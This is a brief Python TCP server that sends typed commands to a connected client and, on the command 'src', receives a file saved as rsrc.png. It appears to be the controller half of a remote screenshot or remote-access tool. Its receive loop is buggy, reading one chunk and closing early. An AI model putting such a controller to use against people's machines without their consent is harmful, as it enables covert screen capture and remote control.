import socket
import os
import pyautogui
import time

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host = '10.0.3.4'
    port = 5000

    s.bind((host,port))
    s.listen()
    print('Server running...')

    c, addr = s.accept()

    while True:
        cmd = str(input('->')).lower()
        c.send(cmd.encode('latin-1'))

        #GET THE SIZE OF THE FILE
        if cmd == 'src':
            src_size = int(c.recv(1024).decode('latin-1',))
            print(str(src_size))

            #RECEIVE FILE
            f = open('rsrc.png', 'wb')
            while src_size != 0 :
                content = c.recv(src_size)
                f.write(content)
                src_size = 0
                f.close()

        

        
            
                
                
main()
                
